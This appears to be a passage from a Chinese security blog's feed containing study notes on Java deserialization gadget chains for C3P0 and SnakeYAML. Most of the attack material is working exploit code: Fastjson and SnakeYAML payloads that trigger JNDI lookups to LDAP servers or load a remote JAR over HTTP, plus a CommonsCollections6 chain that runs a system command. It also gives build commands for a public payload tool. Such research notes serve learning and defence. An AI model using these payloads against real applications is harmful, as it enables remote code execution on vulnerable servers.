class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(DataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        wrap wrapperConnectionPoolDataSourceBase=<span class="keyword">new</span> <span class="title class_">wrap</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> WrapperConnectionPoolDataSourceBase.class.getDeclaredField(<span class="string">&quot;nestedDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(wrapperConnectionPoolDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(wrapperConnectionPoolDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P0</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240423232404.png" alt="image.png"></p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        WrapperConnectionPoolDataSourceBase w1=new WrapperConnectionPoolDataSource();</span></span><br><span class="line"><span class="comment">//        System.out.println(w1.getNestedDataSource());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:1389/Basic/Command/calc\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sink点是JndiRefForwardingDataSource的dereference()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424193942.png" alt="image.png"><br>查找用法向上找到了本类的<code>inner()</code>方法-&lt;<code>setLoginTimeout()</code>方法—&lt;<code>WrapperConnectionPoolDataSource#setLoginTime</code>—&lt;<code>JndiRefConnectionPoolDataSource.setLoginTimeout()</code>方法</p>
<p>这里一开始有个没看懂的点是WrapperConnectionPoolDataSource#setLoginTime()方法里面<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424194049.png" alt="image.png"><br>这个getNesteDataSource()方法跟进后发现是JndiRefForwardingDataSource类,刚好连上链子<br>我们看构造方法发现了答案:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424203925.png" alt="image.png"><br>发现会给wcpds调用setNestedDataSource方法,设置好了JndiRefForwardingDataSource类型的对象</p>
<h3 id="Hex反序列化"><a href="#Hex反序列化" class="headerlink" title="Hex反序列化"></a>Hex反序列化</h3><p>WrapperConnectionPoolDataSource类的构造方法有个C3P0ImplUtils.parseUserOverridesAsString方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424202639.png" alt="image.png"><br>跟进<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424202707.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424202749.png" alt="image.png"></p>
<p>它先判断userOverridesAsString是否3为null,不是就截取HASM_HEADER头和最后的分号之间的部分,然后把数据转成字节数组,强制转化为Map类型,调用SerializableUtils.fromByteArray方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424202941.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424202949.png" alt="image.png"><br>这里可以直接反序列化<br>我们传入的参数是getUserOverridesAsString()方法返回的值,跟进<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424203527.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424203537.png" alt="image.png"></p>
<p>是个字符串类型的内置变量,叫<code>userOverridesAsString</code>,在它父类里面,我们传入的恶意map类赋值给它即可</p>
<p>exp直接抄文章的了<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.beans.PropertyVetoException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0HEx_CC6</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class clazz=LazyMap.class;</span><br><span class="line">        Field factoryField= clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将类序列化为字节数组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字节数组转十六进制</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, PropertyVetoException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240424203659.png" alt="image.png"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://xz.aliyun.com/t/12286">https://xz.aliyun.com/t/12286</a></li>
<li><a href="https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/">https://drun1baby.top/2022/10/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BC3P0%E9%93%BE/</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>snakeyaml链子学习总结</title>
    <url>/2024/04/29/snakeyaml%E9%93%BE/</url>
    <content><![CDATA[<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>示例Person<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">public</span> String school;</span><br><span class="line">    <span class="keyword">protected</span> String province;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSchool</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSchool 方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSchool</span><span class="params">(String school)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setSchool 方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.school = school;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getProvince</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProvince 方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> province;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProvince</span><span class="params">(String province)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setProvince 方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.province = province;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造函数被调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printInfo</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name is &quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;age is&quot;</span> + <span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getName 方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setName 方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getAge 方法被调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(Integer age)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge 方法被调用&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>test<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test_per</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;!!Person &#123;age: 10, name: jmx, province: sichuan, school: cuit&#125;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;age: 20\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name: Drunkbaby&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        Person test=yaml.load(str1);</span><br><span class="line">        System.out.println(test.school);</span><br><span class="line">        <span class="comment">//yaml.loadAs(str2, Person.class);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span>&#123;</span><br><span class="line">        Person person=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.setName(<span class="string">&quot;jmx&quot;</span>);</span><br><span class="line">        person.setAge(<span class="number">20</span>);</span><br><span class="line">        person.setSchool(<span class="string">&quot;cuit&quot;</span>);</span><br><span class="line">        person.setProvince(<span class="string">&quot;sichuan&quot;</span>);</span><br><span class="line">        Yaml yaml=<span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        String str=yaml.dump(person);</span><br><span class="line">        System.out.println(str);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        serialize();</span><br><span class="line">        <span class="comment">//unserialize();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>结论:</p>
<ol>
<li>序列化格式:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!!Person &#123;age: 20, name: jmx, province: sichuan, school: cuit&#125;</span><br></pre></td></tr></table></figure></li>
<li>序列化的时候会调用对应变量的get方法,这里发现个问题,不能调用public变量的get方法(它能直接读取)</li>
<li>反序列化会调用对应类的构造方法和对应变量的set方法,不能调用public变量的set方法(它能直接赋值)</li>
</ol>
<h3 id="利用-SPI-机制-基于-ScriptEngineManager-利用链"><a href="#利用-SPI-机制-基于-ScriptEngineManager-利用链" class="headerlink" title="利用 SPI 机制 - 基于 ScriptEngineManager 利用链"></a>利用 SPI 机制 - 基于 ScriptEngineManager 利用链</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SPInScriptEngineManager</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!javax.script.ScriptEngineManager &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[!!java.net.URLClassLoader &quot;</span> +  </span><br><span class="line">                <span class="string">&quot;[[!!java.net.URL [\&quot;http://localhost:7777/yaml-payload.jar\&quot;]]]]\n&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        yaml.load(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>yaml-payload.jar的GitHub地址: <a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a><br>编译打包:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br></pre></td></tr></table></figure></p>
<p>SPI机制:<br>SPI ，全称为 Service Provider Interface，是一种服务发现机制。它通过在 ClassPath 路径下的 <code>META-INF/services</code> 文件夹查找文件，自动加载文件里所定义的类。也就是动态为某个接口寻找服务实现</p>
<p>我们观察工具的文件就能发现:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428012901.png" alt="image.png"></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428012852.png" alt="image.png"></p>
<p>exp的 <code>[!!</code> 是作为 <code>javax.script.ScriptEngineManager</code> 的属性的，就等于我调用了 <code>javax.script.ScriptEngineManager</code> 这个类,传参是<code>javax.script.ScriptEngineManager</code> </p>
<h3 id="JdbcRowSetImpl链"><a href="#JdbcRowSetImpl链" class="headerlink" title="JdbcRowSetImpl链"></a>JdbcRowSetImpl链</h3><p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428014955.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="string">&quot;!!com.sun.rowset.JdbcRowSetImpl &#123;dataSourceName: \&quot;ldap://127.0.0.1:1389/Basic/Command/calc\&quot;, autoCommit: true&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意高版本jdk的jndi限制,这里用的jdk1.8.0_111<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428015115.png" alt="image.png"></p>
<h3 id="Spring-PropertyPathFactoryBean"><a href="#Spring-PropertyPathFactoryBean" class="headerlink" title="Spring PropertyPathFactoryBean"></a>Spring PropertyPathFactoryBean</h3><p>需要spring环境</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;!!org.springframework.beans.factory.config.PropertyPathFactoryBean\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; targetBeanName: \&quot;ldap://localhost:1389/Basic/Command/calc\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; propertyPath: Drunkbaby\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot; beanFactory: !!org.springframework.jndi.support.SimpleJndiBeanFactory\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;  shareableResources: [\&quot;ldap://localhost:1389/Basic/Command/calc\&quot;]&quot;</span>;</span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();</span><br><span class="line">        yaml.load(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428015513.png" alt="image.png"></p>
<p>入口是PropertyPathFactoryBean的setBeanFactory()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428182339.png" alt="image.png"></p>
<p><code>this.beanFactory</code>是传入的<code>org.springframework.jndi.support.SimpleJndiBeanFactory</code>,调用它的getBean()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240428182535.png" alt="image.png"></p>
